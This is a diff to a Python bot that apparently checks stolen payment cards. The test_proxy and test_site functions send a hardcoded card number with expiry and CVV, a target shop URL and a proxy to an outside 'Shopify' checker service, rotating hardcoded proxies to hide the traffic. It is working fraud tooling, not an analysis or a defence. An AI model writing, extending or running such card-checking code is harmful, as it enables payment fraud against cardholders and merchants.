@@ -2239,8 +2239,8 @@ def get_user_current_tier(user_id: int) -> str:
 # ============================================================
 # Configure logging
 
-# Test site for proxy testing - changed to ipify
-TEST_SITE = "https://api.ipify.org?format=json"  # Using ipify to check if proxy is working
+# Test site for proxy testing - use Shopify endpoint
+TEST_SITE = "https://xaeden.onrender.com/sh"
 
 # Dictionary to store last command time for each user (for cooldown)
 last_command_time = {}
@@ -2338,7 +2338,7 @@ def normalize_proxy_format(proxy: str) -> str:
 
 async def test_proxy(proxy: str) -> Tuple[bool, str]:
     """
-    Test if a proxy works by making a request to a test site.
+    Test if a proxy works by making a request through the Shopify endpoint.
     
     Args:
         proxy: Proxy string to test
@@ -2346,24 +2346,39 @@ async def test_proxy(proxy: str) -> Tuple[bool, str]:
     Returns:
         Tuple of (success, message)
     """
-    # Normalize proxy format
     normalized_proxy = normalize_proxy_format(proxy)
     
-    try:
-        # Create an aiohttp session for async HTTP requests with proper timeout
-        timeout = aiohttp.ClientTimeout(total=15)  # 15 seconds timeout
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            # Make a request through the proxy to the test site
-            async with session.get(TEST_SITE, proxy=normalized_proxy) as response:
-                response.raise_for_status()
-                # Parse the JSON response to verify it's a valid IP
-                data = await response.json()
-                if 'ip' in data and data['ip']:
-                    # If we get a valid IP in the response, the proxy is working
-                    return True, f"Proxy working successfully (IP: {data['ip']})"
-                else:
-                    return False, "Invalid response from ipify API"
+    proxy_for_api = normalized_proxy
+    if proxy_for_api.startswith("http://"):
+        proxy_for_api = proxy_for_api[7:]
+    elif proxy_for_api.startswith("https://"):
+        proxy_for_api = proxy_for_api[8:]
     
+    test_card = "4910149950579116|03|28|106"
+    test_url = f"{TEST_SITE}?cc={test_card}&url=https://naturallclub.com&proxy={proxy_for_api}"
+    
+    try:
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(test_url) as response:
+                if response.status == 200:
+                    try:
+                        data = await response.json()
+                        api_response = data.get("Response", "")
+                        if api_response and "error" not in api_response.lower() and "timeout" not in api_response.lower() and "proxy" not in api_response.lower():
+                            return True, f"Proxy working (Response: {api_response[:50]})"
+                        else:
+                            return False, f"Proxy dead: {api_response[:80]}"
+                    except Exception:
+                        text = await response.text()
+                        if text and len(text) > 10:
+                            return True, f"Proxy working (got response)"
+                        return False, "Empty response"
+                else:
+                    return False, f"HTTP {response.status}"
+    
+    except asyncio.TimeoutError:
+        return False, "Proxy timed out"
     except Exception as e:
         logger.error(f"Error testing proxy: {e}")
         return False, f"Proxy is dead: {str(e)}"
@@ -4139,11 +4154,14 @@ async def test_site(site_url: str, user_id: int, proxy_index: int = 0, retry_cou
         # Get proxy for this request from hardcoded list
         proxy = HARDCODED_PROXIES[proxy_index % len(HARDCODED_PROXIES)]
         # Remove http:// from proxy if present
-        if proxy.startswith("http://"):
-            proxy = proxy[7:]
+        proxy_for_api = proxy
+        if proxy_for_api.startswith("http://"):
+            proxy_for_api = proxy_for_api[7:]
+        elif proxy_for_api.startswith("https://"):
+            proxy_for_api = proxy_for_api[8:]
         
-        # Prepare API URL with query parameters
-        api_url = f"{API_BASE_URL}?cc={TEST_CARD}&url={domain}&proxy="
+        # Prepare API URL with query parameters including the proxy
+        api_url = f"{API_BASE_URL}?cc={TEST_CARD}&url={domain}&proxy={proxy_for_api}"
         
         # Use aiohttp for async HTTP request with extended timeout of 60 seconds
         timeout = aiohttp.ClientTimeout(total=60)
